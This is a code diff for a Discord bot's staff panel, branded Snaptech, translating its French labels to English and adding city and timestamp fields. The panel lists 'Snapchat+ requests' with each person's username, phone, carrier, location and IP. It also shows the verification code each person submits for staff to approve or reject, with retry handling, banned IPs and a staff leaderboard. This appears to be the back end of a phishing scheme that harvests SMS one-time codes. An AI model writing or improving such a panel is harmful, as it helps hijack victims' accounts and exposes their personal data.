@@ -22,7 +22,7 @@ function progressBar(value, max, length = 12) {
 
 function retryLabel(row) {
     // Try to infer attempt count from logs — not available here so we use a neutral label
-    return row.status === "retry_code" ? "🔁 Nouvelle tentative" : "";
+    return row.status === "retry_code" ? "🔁 New attempt" : "";
 }
 
 // ─── New request ──────────────────────────────────────────────────────────────
@@ -33,20 +33,21 @@ export function buildNewRequestEmbed(row) {
     const ip      = row.ip_address;
 
     return new EmbedBuilder()
-        .setTitle("📱 Nouvelle demande Snapchat+")
+        .setTitle("📱 New Snapchat+ Request")
         .setColor(color)
         .setDescription(
             `> 📡 **${carrier}** — ${row.country || "?"}  |  🆔 \`#${row.id}\``
         )
         .addFields(
             { name: "👤 Username",    value: "```\n" + row.username + "\n```",    inline: true  },
-            { name: "📞 Téléphone",   value: "```\n" + formatPhone(row.phone) + "\n```", inline: true },
-            { name: "📡 Opérateur",   value: "`" + carrier + "`",                inline: true  },
-            { name: "🌍 Pays",        value: "`" + (row.country || "?") + "`",   inline: true  },
+            { name: "📞 Phone",       value: "```\n" + formatPhone(row.phone) + "\n```", inline: true },
+            { name: "📡 Carrier",     value: "`" + carrier + "`",                inline: true  },
+            { name: "🌍 Country",     value: "`" + (row.country || "?") + "`",   inline: true  },
+            { name: "🏙️ City",       value: "`" + (row.city || "?") + "`",      inline: true  },
             { name: "🌐 IP",          value: formatIP(ip),                        inline: true  },
-            { name: "⏰ Reçue",       value: "`" + formatDate(row.created_at) + "`", inline: true },
+            { name: "⏰ Received",    value: "`" + formatDate(row.created_at) + "`", inline: true },
         )
-        .setFooter({ text: "⏳ En attente d'un membre du staff  •  Snaptech" })
+        .setFooter({ text: "⏳ Awaiting a staff member  •  Snaptech" })
         .setTimestamp();
 }
 
@@ -65,20 +66,22 @@ export function buildCodeSubmittedEmbed(row) {
         : code;
 
     return new EmbedBuilder()
-        .setTitle("🔓 Code soumis par l'utilisateur")
+        .setTitle("🔓 Code Submitted by User")
         .setColor(0x10b981)
         .setDescription(
-            `> 🔢 Code **${len} chiffres** — \`#${row.id}\`  |  📡 **${carrier}**`
+            `> 🔢 **${len}-digit** code — \`#${row.id}\`  |  📡 **${carrier}**`
         )
         .addFields(
             { name: "👤 Username",    value: "```\n" + row.username + "\n```",    inline: true  },
-            { name: "📞 Téléphone",   value: "```\n" + formatPhone(row.phone) + "\n```", inline: true },
-            { name: "🔢 Code entré",  value: "```\n" + codeFmt + "\n```",         inline: false },
-            { name: "📡 Opérateur",   value: "`" + carrier + "`",                inline: true  },
-            { name: "🌍 Pays",        value: "`" + (row.country || "?") + "`",   inline: true  },
+            { name: "📞 Phone",       value: "```\n" + formatPhone(row.phone) + "\n```", inline: true },
+            { name: "⏰ Submitted",   value: "`" + formatDate(row.updated_at || row.created_at) + "`", inline: true },
+            { name: "🔢 Code Entered", value: "```\n" + codeFmt + "\n```",         inline: false },
+            { name: "📡 Carrier",     value: "`" + carrier + "`",                inline: true  },
+            { name: "🌍 Country",     value: "`" + (row.country || "?") + "`",   inline: true  },
+            { name: "🏙️ City",       value: "`" + (row.city || "?") + "`",      inline: true  },
             { name: "🌐 IP",          value: formatIP(ip),                        inline: true  },
         )
-        .setFooter({ text: "⚡ Valider ou refuser le code ci-dessous  •  Snaptech" })
+        .setFooter({ text: "⚡ Approve or reject the code below  •  Snaptech" })
         .setTimestamp();
 }
 
@@ -90,19 +93,21 @@ export function buildRetryEmbed(row) {
     const ip      = row.ip_address;
 
     return new EmbedBuilder()
-        .setTitle("🔄 Nouveau code en attente")
+        .setTitle("🔄 New Code Pending")
         .setColor(0xf59e0b)
         .setDescription(
-            `> ⚠️ Le code précédent était **incorrect**.\n> L'utilisateur saisit un nouveau code — vérifiez ci-dessous.`
+            `> ⚠️ The previous code was **incorrect**.\n> The user is entering a new code — check it below.`
         )
         .addFields(
             { name: "👤 Username",  value: "```\n" + row.username + "\n```",    inline: true  },
-            { name: "📞 Téléphone", value: "```\n" + formatPhone(row.phone) + "\n```", inline: true },
-            { name: "📡 Opérateur", value: "`" + carrier + "`",                inline: true  },
-            { name: "🌍 Pays",      value: "`" + (row.country || "?") + "`",   inline: true  },
+            { name: "📞 Phone",     value: "```\n" + formatPhone(row.phone) + "\n```", inline: true },
+            { name: "⏰ Retried",    value: "`" + formatDate(row.updated_at || row.created_at) + "`", inline: true },
+            { name: "📡 Carrier",   value: "`" + carrier + "`",                inline: true  },
+            { name: "🌍 Country",   value: "`" + (row.country || "?") + "`",   inline: true  },
+            { name: "🏙️ City",     value: "`" + (row.city || "?") + "`",      inline: true  },
             { name: "🌐 IP",        value: formatIP(ip),                        inline: true  },
         )
-        .setFooter({ text: "🔁 Nouvelle tentative  •  Snaptech" })
+        .setFooter({ text: "🔁 New attempt  •  Snaptech" })
         .setTimestamp();
 }
 
@@ -115,24 +120,24 @@ export function buildStatsEmbed(stats, todayStats) {
     const bar            = progressBar(completed, total);
 
     return new EmbedBuilder()
-        .setTitle("📊 Statistiques globales")
+        .setTitle("📊 Global Statistics")
         .setColor(0x3b82f6)
         .setDescription(
-            `**Taux de complétion : ${completionRate}%**\n\`${bar}\` ${completed}/${total}`
+            `**Completion rate: ${completionRate}%**\n\`${bar}\` ${completed}/${total}`
         )
         .addFields(
             { name: "📋 Total",          value: "`" + stats.total      + "`", inline: true },
-            { name: "⏳ En attente",     value: "`" + stats.pending    + "`", inline: true },
-            { name: "👤 En cours",       value: "`" + stats.processing + "`", inline: true },
-            { name: "⏱️ Attente code",  value: "`" + stats.waiting    + "`", inline: true },
-            { name: "🔓 Code soumis",   value: "`" + stats.submitted  + "`", inline: true },
-            { name: "✅ Complétés",      value: "`" + stats.completed  + "`", inline: true },
+            { name: "⏳ Pending",        value: "`" + stats.pending    + "`", inline: true },
+            { name: "👤 In Progress",   value: "`" + stats.processing + "`", inline: true },
+            { name: "⏱️ Awaiting Code",  value: "`" + stats.waiting    + "`", inline: true },
+            { name: "🔓 Code Submitted", value: "`" + stats.submitted  + "`", inline: true },
+            { name: "✅ Completed",      value: "`" + stats.completed  + "`", inline: true },
             { name: "🔄 Retry",          value: "`" + stats.retry      + "`", inline: true },
-            { name: "❌ Mauvais numéro", value: "`" + stats.wrong      + "`", inline: true },
-            { name: "🚫 IPs bannies",    value: "`" + stats.banned     + "`", inline: true },
+            { name: "❌ Wrong Number",   value: "`" + stats.wrong      + "`", inline: true },
+            { name: "🚫 Banned IPs",     value: "`" + stats.banned     + "`", inline: true },
             {
-                name:  "📅 Aujourd'hui",
-                value: `Demandes : \`${todayStats.requests}\`  ·  Complétées : \`${todayStats.completed}\``,
+                name:  "📅 Today",
+                value: `Requests: \`${todayStats.requests}\`  ·  Completed: \`${todayStats.completed}\``,
                 inline: false,
             },
         )
@@ -144,9 +149,9 @@ export function buildStatsEmbed(stats, todayStats) {
 
 export function buildOperatorStatsEmbed(operatorStats) {
     const embed = new EmbedBuilder()
-        .setTitle("📡 Répartition par opérateur")
+        .setTitle("📡 Operator Distribution")
         .setColor(0x8b5cf6)
-        .setDescription("Demandes par opérateur mobile");
+        .setDescription("Requests by mobile carrier");
 
     const total = operatorStats.reduce((s, r) => s + Number(r.count), 0);
     const medals = ["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣"];
@@ -170,12 +175,12 @@ export function buildOperatorStatsEmbed(operatorStats) {
 
 export function buildLeaderboardEmbed(rows, limit) {
     const embed = new EmbedBuilder()
-        .setTitle("🏆 Classement Staff")
+        .setTitle("🏆 Staff Leaderboard")
         .setColor(0xf59e0b)
-        .setDescription("Top " + limit + " staff par validations de code");
+        .setDescription("Top " + limit + " staff by code validations");
 
     if (rows.length === 0) {
-        embed.setDescription("🏆 Top " + limit + " staff par validations\n\n*Aucune validation enregistrée.*");
+        embed.setDescription("🏆 Top " + limit + " staff by validations\n\n*No validations recorded yet.*");
     } else {
         const maxV  = Number(rows[0].validations) || 1;
         const medals = ["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣","🔟"];
@@ -197,11 +202,11 @@ export function buildLeaderboardEmbed(rows, limit) {
 
 export function buildHourlyStatsEmbed(hourlyData) {
     const embed = new EmbedBuilder()
-        .setTitle("📈 Activité — Dernières 24h")
+        .setTitle("📈 Activity — Last 24h")
         .setColor(0x10b981);
 
     if (hourlyData.length === 0) {
-        embed.setDescription("*Aucune activité ces dernières 24 heures.*");
+        embed.setDescription("*No activity in the last 24 hours.*");
     } else {
         const maxCount = Math.max(...hourlyData.map(r => Number(r.count)));
         let chart = "```\n";
@@ -224,11 +229,11 @@ export function buildHourlyStatsEmbed(hourlyData) {
 
 export function buildStaffActivityEmbed(activityData) {
     const embed = new EmbedBuilder()
-        .setTitle("👥 Activité Staff")
+        .setTitle("👥 Staff Activity")
         .setColor(0xec4899);
 
     if (activityData.length === 0) {
-        embed.setDescription("*Aucune activité enregistrée.*");
+        embed.setDescription("*No activity recorded yet.*");
     } else {
         const grouped = {};
         activityData.forEach(row => {
@@ -261,18 +266,18 @@ export function buildStaffActivityEmbed(activityData) {
 
 export function buildPanelEmbed() {
     return new EmbedBuilder()
-        .setTitle("🎛️ Panel Staff — Snaptech")
+        .setTitle("🎛️ Staff Panel — Snaptech")
         .setDescription(
-            "Les demandes apparaissent ici automatiquement via le polling.\n" +
-            "Utilisez les boutons sur chaque embed pour traiter les demandes.\n\n" +
-            "**🎨 Couleurs par opérateur :**"
+            "Requests appear here automatically via polling.\n" +
+            "Use the buttons on each embed to process requests.\n\n" +
+            "**🎨 Colors by carrier:**"
         )
         .addFields(
-            { name: "🔴 Rouge",  value: "SFR · Telenet",            inline: true },
-            { name: "🟠 Orange", value: "Orange · Orange Belgique", inline: true },
-            { name: "🔵 Bleu",   value: "Bouygues · BASE",          inline: true },
-            { name: "🟣 Violet", value: "Proximus",                  inline: true },
-            { name: "🟡 Jaune",  value: "Autre opérateur",          inline: true },
+            { name: "🔴 Red",    value: "SFR · Telenet",            inline: true },
+            { name: "🟠 Orange", value: "Orange · Orange Belgium",  inline: true },
+            { name: "🔵 Blue",   value: "Bouygues · BASE",          inline: true },
+            { name: "🟣 Purple", value: "Proximus",                  inline: true },
+            { name: "🟡 Yellow", value: "Other carrier",             inline: true },
         )
         .setColor(0x000000)
         .setFooter({ text: "🎛️ Snaptech Panel  •  v2.3" })
